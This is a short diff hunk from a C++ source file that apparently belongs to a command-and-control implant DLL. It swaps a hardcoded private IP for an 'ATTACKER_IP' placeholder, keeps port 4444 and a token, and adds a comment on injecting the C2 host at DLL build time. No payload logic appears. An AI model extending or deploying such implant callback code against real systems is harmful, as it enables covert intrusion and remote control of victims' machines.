@@ -328,7 +328,12 @@ inline Value err_resp(const std::string& msg) {
 // ─────────────────────────────────────────────────────────────────────────────
 // Config (read from environment variables at startup)
 // ─────────────────────────────────────────────────────────────────────────────
-static std::string g_host  = "192.168.1.23";
+// g_host is a build-time PLACEHOLDER, never a real address. The real C2 host is
+// injected by build_dll.sh into a generated copy of this file:
+//     ATTACKER_IP=$(ipconfig getifaddr en0) bash build_dll.sh
+// The build refuses to run without ATTACKER_IP, so an unsubstituted placeholder
+// can never end up in a deployed DLL. Runtime env C2_HOST still overrides.
+static std::string g_host  = "ATTACKER_IP";
 static int         g_port  = 4444;
 static std::string g_token = "token";
 
